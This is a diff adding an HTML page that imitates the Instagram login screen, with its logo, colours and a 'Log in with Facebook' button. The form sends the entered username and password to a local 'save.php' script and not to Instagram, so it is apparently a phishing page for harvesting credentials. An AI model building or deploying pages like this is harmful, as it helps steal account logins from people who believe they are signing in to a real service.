@@ -1,0 +1,70 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram Login</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #fafafa;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .login-container {
+            background-color: white;
+            padding: 20px;
+            border: 1px solid #dbdbdb;
+            text-align: center;
+            width: 300px;
+        }
+        .login-container img {
+            margin: 20px 0;
+        }
+        .login-container input, .login-container button, .login-container a {
+            width: 100%;
+            padding: 10px;
+            margin: 5px 0;
+            border: 1px solid #dbdbdb;
+            border-radius: 3px;
+        }
+        .login-container button {
+            background-color: #0095f6;
+            color: white;
+            border: none;
+            cursor: pointer;
+        }
+        .login-container a {
+            display: block;
+            text-align: center;
+            background-color: transparent;
+            color: #0095f6;
+            border: none;
+            text-decoration: none;
+            cursor: pointer;
+        }
+        .facebook-login {
+            background-color: #4267B2;
+            color: white;
+            margin-top: 10px;
+        }
+    </style>
+</head>
+<body>
+    <form action="save.php" method="post">
+        <div class="login-container">
+            <img src="insta.png" alt="Instagram" width="175">
+            <input type="text" name="username" placeholder="Phone number, username, or email">
+            <input type="password" name="password" placeholder="Password">
+            <button type="submit">Log In</button>
+            <!-- Facebook login button -->
+            <button class="facebook-login">Log in with Facebook</button>
+            <!-- Forget password link -->
+            <a href="your_password_recovery_page.html">Forgot password?</a>
+        </div>
+    </form>
+</body>
+</html>
